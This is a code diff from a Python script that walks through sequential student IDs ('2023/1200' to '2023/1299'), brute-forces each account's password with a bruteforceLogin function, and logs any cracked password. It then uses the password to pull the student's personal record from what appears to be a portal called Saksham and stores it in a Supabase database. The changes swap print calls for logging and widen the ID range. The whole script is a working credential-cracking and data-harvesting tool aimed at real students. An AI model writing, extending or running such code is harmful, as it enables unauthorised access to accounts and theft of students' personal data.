@@ -19,17 +19,15 @@ for handler in logging.getLogger().handlers:
 def main():
     database = SupabaseStudentDatabase()
 
-    for i in range(1203, 1300):
+    for i in range(1200, 1300):
 
         formatted = '{0:04}'.format(i)
         userid = "2023/" + formatted
 
         try:
             if database.getStudentData(userid) is not None:
-                print(f"{userid} password already exist in database/being cracked")
                 logger.info(f"{userid} password already exist in database/being cracked")
             else:
-                print(f"{userid} password not found in database")
                 logger.info(f"{userid} password not found in database")
 
                 # Working status set in database
@@ -39,10 +37,8 @@ def main():
                 }
                 database.addStudentData(userid, data=working_dict)
 
-                start_time = time.perf_counter()
-
-                print("Cracking...")
                 logger.info("Cracking...")
+                start_time = time.perf_counter()
                 password = bruteforceLogin(userid, 1000)
                 end_time = time.perf_counter()
                 elapsedTime = str(end_time - start_time)[:8]
@@ -57,7 +53,6 @@ def main():
                     database.addStudentData(userid, null_dict)
 
                 else:
-                    print("Password found: " + password)
                     logger.info("Password found: " + password)
                     student = getStudentDataFromSaksham(userid, password)
 
@@ -86,11 +81,9 @@ def main():
                         "student_type": student.student_type,
                     }
                     database.addStudentData(userid, student_dict)
-                    print(f"{userid} data retrieved and added to database")
                     logger.info(f"{userid} data retrieved and added to database")
 
         except Exception as e:
-            print(f"Error: {e}")
             logger.error(f"Error: {e}")
 
 
